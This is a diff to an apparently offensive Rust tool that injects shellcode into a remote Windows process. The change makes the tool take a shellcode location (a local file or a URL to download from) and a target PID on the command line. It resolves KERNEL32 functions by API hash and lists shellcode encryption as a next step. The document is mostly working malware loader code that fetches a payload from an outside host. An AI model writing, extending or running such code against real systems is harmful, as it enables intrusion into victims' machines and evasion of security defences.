@@ -4,16 +4,42 @@ mod types;
 mod utils;
 mod helpers;
 mod injection;
+use std::env;
 
 /*
 TODO
-1. Remove process ID hardcoding
-2. Add other types of injections
+1. Add other types of injections
+2. Encrypt/Decrypt the shellcode
 */
 
 fn main() {
-    // Process ID for remote injection
-    let pid_to_inject = 2772;
+
+    let args: Vec<String> = env::args().collect();
+    if args.len() < 3 {
+        println!("[!] Please provide location for the shellcode, either file path or URL and PID to inject");
+        return;
+    }
+    let sc_location: String = args[1].clone();
+    let pid_string: String = args[2].clone();
+    let pid_to_inject = pid_string.parse::<u32>().expect("[!] Cant convert PID to int, check the value!");
+
+    let mut shellcode: Vec<u8> = Vec::new();
+    if sc_location.starts_with("http") {
+        // Download from URL
+        println!("[+] Downloading shellcode from: {}", sc_location);
+        shellcode = utils::download_file(sc_location.as_str());
+    } else {
+        // Read the shellcode from a file on disk (for testing)
+        println!("[+] Reading shellcode from a file: {}", sc_location);
+
+        // The shellcode is read as a byte vector
+        shellcode = match utils::read_file(sc_location.as_str()) {
+            Some(sc) => sc,
+            None => {
+                return
+            }
+        };
+    }
 
     // Define hashes for library and functions that will be used
     let lib_hash: u32 = 4247443901; //KERNEL32.DLL
@@ -28,17 +54,6 @@ fn main() {
 
     // Get the addresses of all functions that will be used
     let apis: HashMap<&str, types::LPVOID> = utils::initAPIs(lib_hash, api_hashes);
-
-    let file_path: &str = "C:\\Users\\nullb1t3\\Desktop\\http.bin";
-    println!("[+] Reading shellcode from a file: {}", file_path);
-
-    // The shellcode is read as a byte vector
-    let shellcode: Vec<u8> = match utils::read_file(file_path) {
-        Some(sc) => sc,
-        None => {
-            return
-        }
-    };
 
     // Inject the shellcode
     injection::remote_inject(apis, shellcode, pid_to_inject as types::DWORD);
